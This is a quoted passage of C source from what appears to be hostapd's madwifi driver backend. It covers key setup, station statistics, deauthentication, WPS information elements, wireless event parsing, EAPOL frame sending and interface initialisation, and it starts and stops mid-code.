> 	struct madwifi_driver_data *drv = priv;
> 	struct ieee80211req_key wk;
> 	u_int8_t cipher;
> 	int ret;
> 
> 	if (alg == WPA_ALG_NONE)
> 		return madwifi_del_key(drv, addr, key_idx);
> 
> 	wpa_printf(MSG_DEBUG, "%s: alg=%d addr=%s key_idx=%d",
> 		   __func__, alg, ether_sprintf(addr), key_idx);
> 
> 	if (alg == WPA_ALG_WEP)
> 		cipher = IEEE80211_CIPHER_WEP;
> 	else if (alg == WPA_ALG_TKIP)
> 		cipher = IEEE80211_CIPHER_TKIP;
> 	else if (alg == WPA_ALG_CCMP)
> 		cipher = IEEE80211_CIPHER_AES_CCM;
> 	else {
> 		printf("%s: unknown/unsupported algorithm %d\n",
> 			__func__, alg);
> 		return -1;
> 	}
> 
> 	if (key_len > sizeof(wk.ik_keydata)) {
> 		printf("%s: key length %lu too big\n", __func__,
> 		       (unsigned long) key_len);
> 		return -3;
> 	}
> 
> 	memset(&wk, 0, sizeof(wk));
> 	wk.ik_type = cipher;
> 	wk.ik_flags = IEEE80211_KEY_RECV | IEEE80211_KEY_XMIT;
> 	if (addr == NULL || is_broadcast_ether_addr(addr)) {
> 		memset(wk.ik_macaddr, 0xff, IEEE80211_ADDR_LEN);
> 		wk.ik_keyix = key_idx;
> 		wk.ik_flags |= IEEE80211_KEY_DEFAULT;
> 	} else {
> 		memcpy(wk.ik_macaddr, addr, IEEE80211_ADDR_LEN);
> 		wk.ik_keyix = IEEE80211_KEYIX_NONE;
> 	}
> 	wk.ik_keylen = key_len;
> 	memcpy(wk.ik_keydata, key, key_len);
> 
> 	ret = set80211priv(drv, IEEE80211_IOCTL_SETKEY, &wk, sizeof(wk));
> 	if (ret < 0) {
> 		wpa_printf(MSG_DEBUG, "%s: Failed to set key (addr %s"
> 			   " key_idx %d alg %d key_len %lu set_tx %d)",
> 			   __func__, ether_sprintf(wk.ik_macaddr), key_idx,
> 			   alg, (unsigned long) key_len, set_tx);
> 	}
> 
> 	return ret;
> }
> 
> 
> static int
> madwifi_get_seqnum(const char *ifname, void *priv, const u8 *addr, int idx,
> 		   u8 *seq)
> {
> 	struct madwifi_driver_data *drv = priv;
> 	struct ieee80211req_key wk;
> 
> 	wpa_printf(MSG_DEBUG, "%s: addr=%s idx=%d",
> 		   __func__, ether_sprintf(addr), idx);
> 
> 	memset(&wk, 0, sizeof(wk));
> 	if (addr == NULL)
> 		memset(wk.ik_macaddr, 0xff, IEEE80211_ADDR_LEN);
> 	else
> 		memcpy(wk.ik_macaddr, addr, IEEE80211_ADDR_LEN);
> 	wk.ik_keyix = idx;
> 
> 	if (set80211priv(drv, IEEE80211_IOCTL_GETKEY, &wk, sizeof(wk))) {
> 		wpa_printf(MSG_DEBUG, "%s: Failed to get encryption data "
> 			   "(addr " MACSTR " key_idx %d)",
> 			   __func__, MAC2STR(wk.ik_macaddr), idx);
> 		return -1;
> 	}
> 
> #ifdef WORDS_BIGENDIAN
> 	{
> 		/*
> 		 * wk.ik_keytsc is in host byte order (big endian), need to
> 		 * swap it to match with the byte order used in WPA.
> 		 */
> 		int i;
> 		u8 tmp[WPA_KEY_RSC_LEN];
> 		memcpy(tmp, &wk.ik_keytsc, sizeof(wk.ik_keytsc));
> 		for (i = 0; i < WPA_KEY_RSC_LEN; i++) {
> 			seq[i] = tmp[WPA_KEY_RSC_LEN - i - 1];
> 		}
> 	}
> #else /* WORDS_BIGENDIAN */
> 	memcpy(seq, &wk.ik_keytsc, sizeof(wk.ik_keytsc));
> #endif /* WORDS_BIGENDIAN */
> 	return 0;
> }
> 
> 
> static int 
> madwifi_flush(void *priv)
> {
> #ifdef MADWIFI_BSD
> 	u8 allsta[IEEE80211_ADDR_LEN];
> 	memset(allsta, 0xff, IEEE80211_ADDR_LEN);
> 	return madwifi_sta_deauth(priv, NULL, allsta,
> 				  IEEE80211_REASON_AUTH_LEAVE);
> #else /* MADWIFI_BSD */
> 	return 0;		/* XXX */
> #endif /* MADWIFI_BSD */
> }
> 
> 
> static int
> madwifi_read_sta_driver_data(void *priv, struct hostap_sta_driver_data *data,
> 			     const u8 *addr)
> {
> 	struct madwifi_driver_data *drv = priv;
> 
> #ifdef MADWIFI_BSD
> 	struct ieee80211req_sta_stats stats;
> 
> 	memset(data, 0, sizeof(*data));
> 
> 	/*
> 	 * Fetch statistics for station from the system.
> 	 */
> 	memset(&stats, 0, sizeof(stats));
> 	memcpy(stats.is_u.macaddr, addr, IEEE80211_ADDR_LEN);
> 	if (set80211priv(drv,
> #ifdef MADWIFI_NG
> 			 IEEE80211_IOCTL_STA_STATS,
> #else /* MADWIFI_NG */
> 			 IEEE80211_IOCTL_GETSTASTATS,
> #endif /* MADWIFI_NG */
> 			 &stats, sizeof(stats))) {
> 		wpa_printf(MSG_DEBUG, "%s: Failed to fetch STA stats (addr "
> 			   MACSTR ")", __func__, MAC2STR(addr));
> 		if (memcmp(addr, drv->acct_mac, ETH_ALEN) == 0) {
> 			memcpy(data, &drv->acct_data, sizeof(*data));
> 			return 0;
> 		}
> 
> 		printf("Failed to get station stats information element.\n");
> 		return -1;
> 	}
> 
> 	data->rx_packets = stats.is_stats.ns_rx_data;
> 	data->rx_bytes = stats.is_stats.ns_rx_bytes;
> 	data->tx_packets = stats.is_stats.ns_tx_data;
> 	data->tx_bytes = stats.is_stats.ns_tx_bytes;
> 	return 0;
> 
> #else /* MADWIFI_BSD */
> 
> 	char buf[1024], line[128], *pos;
> 	FILE *f;
> 	unsigned long val;
> 
> 	memset(data, 0, sizeof(*data));
> 	snprintf(buf, sizeof(buf), "/proc/net/madwifi/%s/" MACSTR,
> 		 drv->iface, MAC2STR(addr));
> 
> 	f = fopen(buf, "r");
> 	if (!f) {
> 		if (memcmp(addr, drv->acct_mac, ETH_ALEN) != 0)
> 			return -1;
> 		memcpy(data, &drv->acct_data, sizeof(*data));
> 		return 0;
> 	}
> 	/* Need to read proc file with in one piece, so use large enough
> 	 * buffer. */
> 	setbuffer(f, buf, sizeof(buf));
> 
> 	while (fgets(line, sizeof(line), f)) {
> 		pos = strchr(line, '=');
> 		if (!pos)
> 			continue;
> 		*pos++ = '\0';
> 		val = strtoul(pos, NULL, 10);
> 		if (strcmp(line, "rx_packets") == 0)
> 			data->rx_packets = val;
> 		else if (strcmp(line, "tx_packets") == 0)
> 			data->tx_packets = val;
> 		else if (strcmp(line, "rx_bytes") == 0)
> 			data->rx_bytes = val;
> 		else if (strcmp(line, "tx_bytes") == 0)
> 			data->tx_bytes = val;
> 	}
> 
> 	fclose(f);
> 
> 	return 0;
> #endif /* MADWIFI_BSD */
> }
> 
> 
> static int
> madwifi_sta_clear_stats(void *priv, const u8 *addr)
> {
> #if defined(MADWIFI_BSD) && defined(IEEE80211_MLME_CLEAR_STATS)
> 	struct madwifi_driver_data *drv = priv;
> 	struct ieee80211req_mlme mlme;
> 	int ret;
> 
> 	wpa_printf(MSG_DEBUG, "%s: addr=%s", __func__, ether_sprintf(addr));
> 
> 	mlme.im_op = IEEE80211_MLME_CLEAR_STATS;
> 	memcpy(mlme.im_macaddr, addr, IEEE80211_ADDR_LEN);
> 	ret = set80211priv(drv, IEEE80211_IOCTL_SETMLME, &mlme,
> 			   sizeof(mlme));
> 	if (ret < 0) {
> 		wpa_printf(MSG_DEBUG, "%s: Failed to clear STA stats (addr "
> 			   MACSTR ")", __func__, MAC2STR(addr));
> 	}
> 
> 	return ret;
> #else /* MADWIFI_BSD && IEEE80211_MLME_CLEAR_STATS */
> 	return 0; /* FIX */
> #endif /* MADWIFI_BSD && IEEE80211_MLME_CLEAR_STATS */
> }
> 
> 
> static int
> madwifi_set_opt_ie(void *priv, const u8 *ie, size_t ie_len)
> {
> 	/*
> 	 * Do nothing; we setup parameters at startup that define the
> 	 * contents of the beacon information element.
> 	 */
> 	return 0;
> }
> 
> static int
> madwifi_sta_deauth(void *priv, const u8 *own_addr, const u8 *addr,
> 		   int reason_code)
> {
> 	struct madwifi_driver_data *drv = priv;
> 	struct ieee80211req_mlme mlme;
> 	int ret;
> 
> 	wpa_printf(MSG_DEBUG, "%s: addr=%s reason_code=%d",
> 		   __func__, ether_sprintf(addr), reason_code);
> 
> 	mlme.im_op = IEEE80211_MLME_DEAUTH;
> 	mlme.im_reason = reason_code;
> 	memcpy(mlme.im_macaddr, addr, IEEE80211_ADDR_LEN);
> 	ret = set80211priv(drv, IEEE80211_IOCTL_SETMLME, &mlme, sizeof(mlme));
> 	if (ret < 0) {
> 		wpa_printf(MSG_DEBUG, "%s: Failed to deauth STA (addr " MACSTR
> 			   " reason %d)",
> 			   __func__, MAC2STR(addr), reason_code);
> 	}
> 
> 	return ret;
> }
> 
> static int
> madwifi_sta_disassoc(void *priv, const u8 *own_addr, const u8 *addr,
> 		     int reason_code)
> {
> 	struct madwifi_driver_data *drv = priv;
> 	struct ieee80211req_mlme mlme;
> 	int ret;
> 
> 	wpa_printf(MSG_DEBUG, "%s: addr=%s reason_code=%d",
> 		   __func__, ether_sprintf(addr), reason_code);
> 
> 	mlme.im_op = IEEE80211_MLME_DISASSOC;
> 	mlme.im_reason = reason_code;
> 	memcpy(mlme.im_macaddr, addr, IEEE80211_ADDR_LEN);
> 	ret = set80211priv(drv, IEEE80211_IOCTL_SETMLME, &mlme, sizeof(mlme));
> 	if (ret < 0) {
> 		wpa_printf(MSG_DEBUG, "%s: Failed to disassoc STA (addr "
> 			   MACSTR " reason %d)",
> 			   __func__, MAC2STR(addr), reason_code);
> 	}
> 
> 	return ret;
> }
> 
> #ifdef CONFIG_WPS
> #ifdef IEEE80211_IOCTL_FILTERFRAME
> static void madwifi_raw_receive(void *ctx, const u8 *src_addr, const u8 *buf,
> 				size_t len)
> {
> 	struct madwifi_driver_data *drv = ctx;
> 	const struct ieee80211_mgmt *mgmt;
> 	u16 fc;
> 	union wpa_event_data event;
> 
> 	/* Send Probe Request information to WPS processing */
> 
> 	if (len < IEEE80211_HDRLEN + sizeof(mgmt->u.probe_req))
> 		return;
> 	mgmt = (const struct ieee80211_mgmt *) buf;
> 
> 	fc = le_to_host16(mgmt->frame_control);
> 	if (WLAN_FC_GET_TYPE(fc) != WLAN_FC_TYPE_MGMT ||
> 	    WLAN_FC_GET_STYPE(fc) != WLAN_FC_STYPE_PROBE_REQ)
> 		return;
> 
> 	os_memset(&event, 0, sizeof(event));
> 	event.rx_probe_req.sa = mgmt->sa;
> 	event.rx_probe_req.da = mgmt->da;
> 	event.rx_probe_req.bssid = mgmt->bssid;
> 	event.rx_probe_req.ie = mgmt->u.probe_req.variable;
> 	event.rx_probe_req.ie_len =
> 		len - (IEEE80211_HDRLEN + sizeof(mgmt->u.probe_req));
> 	wpa_supplicant_event(drv->hapd, EVENT_RX_PROBE_REQ, &event);
> }
> #endif /* IEEE80211_IOCTL_FILTERFRAME */
> #endif /* CONFIG_WPS */
> 
> static int madwifi_receive_probe_req(struct madwifi_driver_data *drv)
> {
> 	int ret = 0;
> #ifdef CONFIG_WPS
> #ifdef IEEE80211_IOCTL_FILTERFRAME
> 	struct ieee80211req_set_filter filt;
> 
> 	wpa_printf(MSG_DEBUG, "%s Enter", __func__);
> 	filt.app_filterype = IEEE80211_FILTER_TYPE_PROBE_REQ;
> 
> 	ret = set80211priv(drv, IEEE80211_IOCTL_FILTERFRAME, &filt,
> 			   sizeof(struct ieee80211req_set_filter));
> 	if (ret)
> 		return ret;
> 
> 	drv->sock_raw = l2_packet_init(drv->iface, NULL, ETH_P_80211_RAW,
> 				       madwifi_raw_receive, drv, 1);
> 	if (drv->sock_raw == NULL)
> 		return -1;
> #endif /* IEEE80211_IOCTL_FILTERFRAME */
> #endif /* CONFIG_WPS */
> 	return ret;
> }
> 
> #ifdef CONFIG_WPS
> static int
> madwifi_set_wps_ie(void *priv, const u8 *ie, size_t len, u32 frametype)
> {
> 	struct madwifi_driver_data *drv = priv;
> 	u8 buf[256];
> 	struct ieee80211req_getset_appiebuf *beac_ie;
> 
> 	wpa_printf(MSG_DEBUG, "%s buflen = %lu", __func__,
> 		   (unsigned long) len);
> 
> 	beac_ie = (struct ieee80211req_getset_appiebuf *) buf;
> 	beac_ie->app_frmtype = frametype;
> 	beac_ie->app_buflen = len;
> 	memcpy(&(beac_ie->app_buf[0]), ie, len);
> 
> 	return set80211priv(drv, IEEE80211_IOCTL_SET_APPIEBUF, beac_ie,
> 			    sizeof(struct ieee80211req_getset_appiebuf) + len);
> }
> 
> static int
> madwifi_set_ap_wps_ie(void *priv, const struct wpabuf *beacon,
> 		      const struct wpabuf *proberesp,
> 		      const struct wpabuf *assocresp)
> {
> 	if (madwifi_set_wps_ie(priv, beacon ? wpabuf_head(beacon) : NULL,
> 			       beacon ? wpabuf_len(beacon) : 0,
> 			       IEEE80211_APPIE_FRAME_BEACON) < 0)
> 		return -1;
> 	return madwifi_set_wps_ie(priv,
> 				  proberesp ? wpabuf_head(proberesp) : NULL,
> 				  proberesp ? wpabuf_len(proberesp) : 0,
> 				  IEEE80211_APPIE_FRAME_PROBE_RESP);
> }
> #else /* CONFIG_WPS */
> #define madwifi_set_ap_wps_ie NULL
> #endif /* CONFIG_WPS */
> 
> static int madwifi_set_freq(void *priv, struct hostapd_freq_params *freq)
> {
> 	struct madwifi_driver_data *drv = priv;
> 	struct iwreq iwr;
> 
> 	os_memset(&iwr, 0, sizeof(iwr));
> 	os_strlcpy(iwr.ifr_name, drv->iface, IFNAMSIZ);
> 	iwr.u.freq.m = freq->channel;
> 	iwr.u.freq.e = 0;
> 
> 	if (ioctl(drv->ioctl_sock, SIOCSIWFREQ, &iwr) < 0) {
> 		perror("ioctl[SIOCSIWFREQ]");
> 		return -1;
> 	}
> 
> 	return 0;
> }
> 
> static void
> madwifi_new_sta(struct madwifi_driver_data *drv, u8 addr[IEEE80211_ADDR_LEN])
> {
> 	struct hostapd_data *hapd = drv->hapd;
> 	struct ieee80211req_wpaie ie;
> 	int ielen = 0;
> 	u8 *iebuf = NULL;
> 
> 	/*
> 	 * Fetch negotiated WPA/RSN parameters from the system.
> 	 */
> 	memset(&ie, 0, sizeof(ie));
> 	memcpy(ie.wpa_macaddr, addr, IEEE80211_ADDR_LEN);
> 	if (set80211priv(drv, IEEE80211_IOCTL_GETWPAIE, &ie, sizeof(ie))) {
> 		wpa_printf(MSG_DEBUG, "%s: Failed to get WPA/RSN IE",
> 			   __func__);
> 		goto no_ie;
> 	}
> 	wpa_hexdump(MSG_MSGDUMP, "madwifi req WPA IE",
> 		    ie.wpa_ie, IEEE80211_MAX_OPT_IE);
> 	iebuf = ie.wpa_ie;
> 	/* madwifi seems to return some random data if WPA/RSN IE is not set.
> 	 * Assume the IE was not included if the IE type is unknown. */
> 	if (iebuf[0] != WLAN_EID_VENDOR_SPECIFIC)
> 		iebuf[1] = 0;
> #ifdef MADWIFI_NG
> 	wpa_hexdump(MSG_MSGDUMP, "madwifi req RSN IE",
> 		    ie.rsn_ie, IEEE80211_MAX_OPT_IE);
> 	if (iebuf[1] == 0 && ie.rsn_ie[1] > 0) {
> 		/* madwifi-ng svn #1453 added rsn_ie. Use it, if wpa_ie was not
> 		 * set. This is needed for WPA2. */
> 		iebuf = ie.rsn_ie;
> 		if (iebuf[0] != WLAN_EID_RSN)
> 			iebuf[1] = 0;
> 	}
> #endif /* MADWIFI_NG */
> 
> 	ielen = iebuf[1];
> 	if (ielen == 0)
> 		iebuf = NULL;
> 	else
> 		ielen += 2;
> 
> no_ie:
> 	drv_event_assoc(hapd, addr, iebuf, ielen, 0);
> 
> 	if (memcmp(addr, drv->acct_mac, ETH_ALEN) == 0) {
> 		/* Cached accounting data is not valid anymore. */
> 		memset(drv->acct_mac, 0, ETH_ALEN);
> 		memset(&drv->acct_data, 0, sizeof(drv->acct_data));
> 	}
> }
> 
> static void
> madwifi_wireless_event_wireless_custom(struct madwifi_driver_data *drv,
> 				       char *custom)
> {
> 	wpa_printf(MSG_DEBUG, "Custom wireless event: '%s'", custom);
> 
> 	if (strncmp(custom, "MLME-MICHAELMICFAILURE.indication", 33) == 0) {
> 		char *pos;
> 		u8 addr[ETH_ALEN];
> 		pos = strstr(custom, "addr=");
> 		if (pos == NULL) {
> 			wpa_printf(MSG_DEBUG,
> 				   "MLME-MICHAELMICFAILURE.indication "
> 				   "without sender address ignored");
> 			return;
> 		}
> 		pos += 5;
> 		if (hwaddr_aton(pos, addr) == 0) {
> 			union wpa_event_data data;
> 			os_memset(&data, 0, sizeof(data));
> 			data.michael_mic_failure.unicast = 1;
> 			data.michael_mic_failure.src = addr;
> 			wpa_supplicant_event(drv->hapd,
> 					     EVENT_MICHAEL_MIC_FAILURE, &data);
> 		} else {
> 			wpa_printf(MSG_DEBUG,
> 				   "MLME-MICHAELMICFAILURE.indication "
> 				   "with invalid MAC address");
> 		}
> 	} else if (strncmp(custom, "STA-TRAFFIC-STAT", 16) == 0) {
> 		char *key, *value;
> 		u32 val;
> 		key = custom;
> 		while ((key = strchr(key, '\n')) != NULL) {
> 			key++;
> 			value = strchr(key, '=');
> 			if (value == NULL)
> 				continue;
> 			*value++ = '\0';
> 			val = strtoul(value, NULL, 10);
> 			if (strcmp(key, "mac") == 0)
> 				hwaddr_aton(value, drv->acct_mac);
> 			else if (strcmp(key, "rx_packets") == 0)
> 				drv->acct_data.rx_packets = val;
> 			else if (strcmp(key, "tx_packets") == 0)
> 				drv->acct_data.tx_packets = val;
> 			else if (strcmp(key, "rx_bytes") == 0)
> 				drv->acct_data.rx_bytes = val;
> 			else if (strcmp(key, "tx_bytes") == 0)
> 				drv->acct_data.tx_bytes = val;
> 			key = value;
> 		}
> 	}
> }
> 
> static void
> madwifi_wireless_event_wireless(struct madwifi_driver_data *drv,
> 					    char *data, int len)
> {
> 	struct iw_event iwe_buf, *iwe = &iwe_buf;
> 	char *pos, *end, *custom, *buf;
> 
> 	pos = data;
> 	end = data + len;
> 
> 	while (pos + IW_EV_LCP_LEN <= end) {
> 		/* Event data may be unaligned, so make a local, aligned copy
> 		 * before processing. */
> 		memcpy(&iwe_buf, pos, IW_EV_LCP_LEN);
> 		wpa_printf(MSG_MSGDUMP, "Wireless event: cmd=0x%x len=%d",
> 			   iwe->cmd, iwe->len);
> 		if (iwe->len <= IW_EV_LCP_LEN)
> 			return;
> 
> 		custom = pos + IW_EV_POINT_LEN;
> 		if (drv->we_version > 18 &&
> 		    (iwe->cmd == IWEVMICHAELMICFAILURE ||
> 		     iwe->cmd == IWEVCUSTOM)) {
> 			/* WE-19 removed the pointer from struct iw_point */
> 			char *dpos = (char *) &iwe_buf.u.data.length;
> 			int dlen = dpos - (char *) &iwe_buf;
> 			memcpy(dpos, pos + IW_EV_LCP_LEN,
> 			       sizeof(struct iw_event) - dlen);
> 		} else {
> 			memcpy(&iwe_buf, pos, sizeof(struct iw_event));
> 			custom += IW_EV_POINT_OFF;
> 		}
> 
> 		switch (iwe->cmd) {
> 		case IWEVEXPIRED:
> 			drv_event_disassoc(drv->hapd,
> 					   (u8 *) iwe->u.addr.sa_data);
> 			break;
> 		case IWEVREGISTERED:
> 			madwifi_new_sta(drv, (u8 *) iwe->u.addr.sa_data);
> 			break;
> 		case IWEVCUSTOM:
> 			if (custom + iwe->u.data.length > end)
> 				return;
> 			buf = malloc(iwe->u.data.length + 1);
> 			if (buf == NULL)
> 				return;		/* XXX */
> 			memcpy(buf, custom, iwe->u.data.length);
> 			buf[iwe->u.data.length] = '\0';
> 			madwifi_wireless_event_wireless_custom(drv, buf);
> 			free(buf);
> 			break;
> 		}
> 
> 		pos += iwe->len;
> 	}
> }
> 
> 
> static void
> madwifi_wireless_event_rtm_newlink(void *ctx, struct ifinfomsg *ifi,
> 				   u8 *buf, size_t len)
> {
> 	struct madwifi_driver_data *drv = ctx;
> 	int attrlen, rta_len;
> 	struct rtattr *attr;
> 
> 	if (ifi->ifi_index != drv->ifindex)
> 		return;
> 
> 	attrlen = len;
> 	attr = (struct rtattr *) buf;
> 
> 	rta_len = RTA_ALIGN(sizeof(struct rtattr));
> 	while (RTA_OK(attr, attrlen)) {
> 		if (attr->rta_type == IFLA_WIRELESS) {
> 			madwifi_wireless_event_wireless(
> 				drv, ((char *) attr) + rta_len,
> 				attr->rta_len - rta_len);
> 		}
> 		attr = RTA_NEXT(attr, attrlen);
> 	}
> }
> 
> 
> static int
> madwifi_get_we_version(struct madwifi_driver_data *drv)
> {
> 	struct iw_range *range;
> 	struct iwreq iwr;
> 	int minlen;
> 	size_t buflen;
> 
> 	drv->we_version = 0;
> 
> 	/*
> 	 * Use larger buffer than struct iw_range in order to allow the
> 	 * structure to grow in the future.
> 	 */
> 	buflen = sizeof(struct iw_range) + 500;
> 	range = os_zalloc(buflen);
> 	if (range == NULL)
> 		return -1;
> 
> 	memset(&iwr, 0, sizeof(iwr));
> 	os_strlcpy(iwr.ifr_name, drv->iface, IFNAMSIZ);
> 	iwr.u.data.pointer = (caddr_t) range;
> 	iwr.u.data.length = buflen;
> 
> 	minlen = ((char *) &range->enc_capa) - (char *) range +
> 		sizeof(range->enc_capa);
> 
> 	if (ioctl(drv->ioctl_sock, SIOCGIWRANGE, &iwr) < 0) {
> 		perror("ioctl[SIOCGIWRANGE]");
> 		free(range);
> 		return -1;
> 	} else if (iwr.u.data.length >= minlen &&
> 		   range->we_version_compiled >= 18) {
> 		wpa_printf(MSG_DEBUG, "SIOCGIWRANGE: WE(compiled)=%d "
> 			   "WE(source)=%d enc_capa=0x%x",
> 			   range->we_version_compiled,
> 			   range->we_version_source,
> 			   range->enc_capa);
> 		drv->we_version = range->we_version_compiled;
> 	}
> 
> 	free(range);
> 	return 0;
> }
> 
> 
> static int
> madwifi_wireless_event_init(struct madwifi_driver_data *drv)
> {
> 	struct netlink_config *cfg;
> 
> 	madwifi_get_we_version(drv);
> 
> 	cfg = os_zalloc(sizeof(*cfg));
> 	if (cfg == NULL)
> 		return -1;
> 	cfg->ctx = drv;
> 	cfg->newlink_cb = madwifi_wireless_event_rtm_newlink;
> 	drv->netlink = netlink_init(cfg);
> 	if (drv->netlink == NULL) {
> 		os_free(cfg);
> 		return -1;
> 	}
> 
> 	return 0;
> }
> 
> 
> static int
> madwifi_send_eapol(void *priv, const u8 *addr, const u8 *data, size_t data_len,
> 		   int encrypt, const u8 *own_addr, u32 flags)
> {
> 	struct madwifi_driver_data *drv = priv;
> 	unsigned char buf[3000];
> 	unsigned char *bp = buf;
> 	struct l2_ethhdr *eth;
> 	size_t len;
> 	int status;
> 
> 	/*
> 	 * Prepend the Ethernet header.  If the caller left us
> 	 * space at the front we could just insert it but since
> 	 * we don't know we copy to a local buffer.  Given the frequency
> 	 * and size of frames this probably doesn't matter.
> 	 */
> 	len = data_len + sizeof(struct l2_ethhdr);
> 	if (len > sizeof(buf)) {
> 		bp = malloc(len);
> 		if (bp == NULL) {
> 			printf("EAPOL frame discarded, cannot malloc temp "
> 			       "buffer of size %lu!\n", (unsigned long) len);
> 			return -1;
> 		}
> 	}
> 	eth = (struct l2_ethhdr *) bp;
> 	memcpy(eth->h_dest, addr, ETH_ALEN);
> 	memcpy(eth->h_source, own_addr, ETH_ALEN);
> 	eth->h_proto = host_to_be16(ETH_P_EAPOL);
> 	memcpy(eth+1, data, data_len);
> 
> 	wpa_hexdump(MSG_MSGDUMP, "TX EAPOL", bp, len);
> 
> 	status = l2_packet_send(drv->sock_xmit, addr, ETH_P_EAPOL, bp, len);
> 
> 	if (bp != buf)
> 		free(bp);
> 	return status;
> }
> 
> static void
> handle_read(void *ctx, const u8 *src_addr, const u8 *buf, size_t len)
> {
> 	struct madwifi_driver_data *drv = ctx;
> 	drv_event_eapol_rx(drv->hapd, src_addr, buf + sizeof(struct l2_ethhdr),
> 			   len - sizeof(struct l2_ethhdr));
> }
> 
> static void *
> madwifi_init(struct hostapd_data *hapd, struct wpa_init_params *params)
> {
> 	struct madwifi_driver_data *drv;
> 	struct ifreq ifr;
> 	struct iwreq iwr;
> 	char brname[IFNAMSIZ];
> 
> 	drv = os_zalloc(sizeof(struct madwifi_driver_data));
> 	if (drv == NULL) {
> 		printf("Could not allocate memory for madwifi driver data\n");
> 		return NULL;
> 	}
> 
> 	drv->hapd = hapd;
> 	drv->ioctl_sock = socket(PF_INET, SOCK_DGRAM, 0);
> 	if (drv->ioctl_sock < 0) {
> 		perror("socket[PF_INET,SOCK_DGRAM]");
> 		goto bad;
> 	}
> 	memcpy(drv->iface, params->ifname, sizeof(drv->iface));
> 
> 	memset(&ifr, 0, sizeof(ifr));
> 	os_strlcpy(ifr.ifr_name, drv->iface, sizeof(ifr.ifr_name));
> 	if (ioctl(drv->ioctl_sock, SIOCGIFINDEX, &ifr) != 0) {
> 		perror("ioctl(SIOCGIFINDEX)");
> 		goto bad;
> 	}
> 	drv->ifindex = ifr.ifr_ifindex;
> 
> 	drv->sock_xmit = l2_packet_init(drv->iface, NULL, ETH_P_EAPOL,
> 					handle_read, drv, 1);
> 	if (drv->sock_xmit == NULL)
> 		goto bad;
> 	if (l2_packet_get_own_addr(drv->sock_xmit, params->own_addr))
> 		goto bad;
> 	if (params->bridge[0]) {
> 		wpa_printf(MSG_DEBUG, "Configure bridge %s for EAPOL traffic.",
> 			   params->bridge[0]);
> 		drv->sock_recv = l2_packet_init(params->bridge[0], NULL,
> 						ETH_P_EAPOL, handle_read, drv,
> 						1);
> 		if (drv->sock_recv == NULL)
> 			goto bad;
> 	} else if (linux_br_get(brname, drv->iface) == 0) {
> 		wpa_printf(MSG_DEBUG, "Interface in bridge %s; configure for "
> 			   "EAPOL receive", brname);
> 		drv->sock_recv = l2_packet_init(brname, NULL, ETH_P_EAPOL,
> 						handle_read, drv, 1);
> 		if (drv->sock_recv == NULL)
> 			goto bad;
> 	} else
> 		drv->sock_recv = drv->sock_xmit;
> 
> 	memset(&iwr, 0, sizeof(iwr));
> 	os_strlcpy(iwr.ifr_name, drv->iface, IFNAMSIZ);
> 
> 	iwr.u.mode = IW_MODE_MASTER;
> 
> 	if (ioctl(drv->ioctl_sock, SIOCSIWMODE, &iwr) < 0) {
> 		perror("ioctl[SIOCSIWMODE]");
> 		printf("Could not set interface to master mode!\n");
> 		goto bad;
> 	}
> 
> 	/* mark down during setup */
> 	linux_set_iface_flags(drv->ioctl_sock, drv->iface, 0);
> 	madwifi_set_privacy(drv, 0); /* default to no privacy */
> 
> 	madwifi_receive_probe_req(drv);
> 
> 	if (madwifi_wireless_event_init(drv))
> 		goto bad;
> 
> 	return drv;
> bad:
> 	if (drv->sock_xmit != NULL)
> 		l2_packet_deinit(drv->sock_xmit);
> 	if (drv->ioctl_sock >= 0)
> 		close(drv->ioctl_sock);
> 	if (drv != NULL)
> 		free(drv);
> 	return NULL;
> }
> 
> 
> static void
> madwifi_deinit(void *priv)
> {
> 	struct madwifi_driver_data *drv = priv;
> 
> 	netlink_deinit(drv->netlink);
> 	(void) linux_set_iface_flags(drv->ioctl_sock, drv->iface, 0);
> 	if (drv->ioctl_sock >= 0)
> 		close(drv->ioctl_sock);
> 	if (drv->sock_recv != NULL && drv->sock_recv != drv->sock_xmit)
> 		l2_packet_deinit(drv->sock_recv);
> 	if (drv->sock_xmit != NULL)
> 		l2_packet_deinit(drv->sock_xmit);
> 	if (drv->sock_raw)
> 		l2_packet_deinit(drv->sock_raw);
> 	free(drv);
> }
> 
> static int
> madwifi_set_ssid(void *priv, const u8 *buf, int len)
> {
> 	struct madwifi_driver_data *drv = priv;
> 	struct iwreq iwr;
> 
> 	memset(&iwr, 0, sizeof(iwr));
> 	os_strlcpy(iwr.ifr_name, drv->iface, IFNAMSIZ);
> 	iwr.u.essid.flags = 1; /* SSID active */
> 	iwr.u.essid.pointer = (caddr_t) buf;
> 	iwr.u.essid.length = len + 1;
> 
> 	if (ioctl(drv->ioctl_sock, SIOCSIWESSID, &iwr) < 0) {
> 		perror("ioctl[SIOCSIWESSID]");
> 		printf("len=%d\n", len);
> 		return -1;
> 	}
> 	return 0;
> }
> 
> static int
> madwifi_get_ssid(void *priv, u8 *buf, int len)
> {
> 	struct madwifi_driver_data *drv = priv;
> 	struct iwreq iwr;
> 	int ret = 0;
> 
> 	memset(&iwr, 0, sizeof(iwr));
> 	os_strlcpy(iwr.ifr_name, drv->iface, IFNAMSIZ);
> 	iwr.u.essid.pointer = (caddr_t) buf;
> 	iwr.u.essid.length = len;
> 
> 	if (ioctl(drv->ioctl_sock, SIOCGIWESSID, &iwr) < 0) {
> 		perror("ioctl[SIOCGIWESSID]");
> 		ret = -1;
> 	} else
> 		ret = iwr.u.essid.length;
> 
> 	return ret;
> }
> 
> static int
> madwifi_set_countermeasures(void *priv, int enabled)
> {
> 	struct madwifi_driver_data *drv = priv;
> 	wpa_printf(MSG_DEBUG, "%s: enabled=%d", __FUNCTION__, enabled);
> 	return set80211param(drv, IEEE80211_PARAM_COUNTERMEASURES, enabled);
> }
> 
> static int
> madwifi_commit(void *priv)
> {
> 	struct madwifi_driver_data *drv = priv;
> 	return linux_set_iface_flags(drv->ioctl_sock, drv->iface, 1);
> }
> 
> 
> const struct wpa_driver_ops wpa_driver_madwifi_ops = {
> 	.name			= "madwifi",
> 	.desc			= "MADWIFI 802.11 support (Atheros, etc.)",
> 	.set_key		= wpa_driver_madwifi_set_key,
> 	.hapd_init		= madwifi_init,
> 	.hapd_deinit		= madwifi_deinit,
> 	.set_ieee8021x		= madwifi_set_ieee8021x,
> 	.set_privacy		= madwifi_set_privacy,
> 	.get_seqnum		= madwifi_get_seqnum,
> 	.flush			= madwifi_flush,
> 	.set_generic_elem	= madwifi_set_opt_ie,
> 	.sta_set_flags		= madwifi_sta_set_flags,
> 	.read_sta_data		= madwifi_read_sta_driver_data,
> 	.hapd_send_eapol	= madwifi_send_eapol,
> 	.sta_disassoc		= madwifi_sta_disassoc,
